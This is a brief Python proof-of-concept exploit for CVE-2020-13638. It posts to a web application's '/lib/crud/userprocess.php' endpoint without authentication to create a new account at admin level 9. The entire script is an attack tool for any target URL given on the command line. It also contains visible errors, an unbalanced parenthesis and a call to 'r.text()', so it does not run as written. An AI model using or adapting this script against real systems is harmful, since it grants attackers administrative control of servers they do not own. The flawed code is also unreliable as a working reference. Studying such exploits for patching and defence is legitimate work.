#!/usr/bin/python3
# CVE-2020-13638
# author https://github.com/theguly/

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

burl = "/lib/crud/userprocess.php"

if len(sys.argv) < 5:
  print('use: ./{} target user password email'.format(sys.argv[0]))
  print('./{} https://1.2.3.4/ theguly V3ry_Str0ng_1 theguly@users.noreply.github.com'.format(sys.argv[0]))
  print('be sure to use a pass that respect policies: must contain at least one uppercase, lowercase, number, special char (of @#-_$%^&+=!?) and be at least 8 char. the username will be lowercased'))
  sys.exit()

url    = sys.argv[1] + burl
user   = sys.argv[2].lower()
passwd = sys.argv[3]
email  = sys.argv[4]

data = {"add": "1", "editid": '', "username": user, "password": passwd, "passconf": passwd, "email": email, "ulevelid": "9"}
# ADMIN_LEVEL: 9
# USER_LEVEL:  1
# GUEST_LEVEL: 0

r = requests.post(url, data=data)
print(r.text())
print('POST call done, you can now try to login')
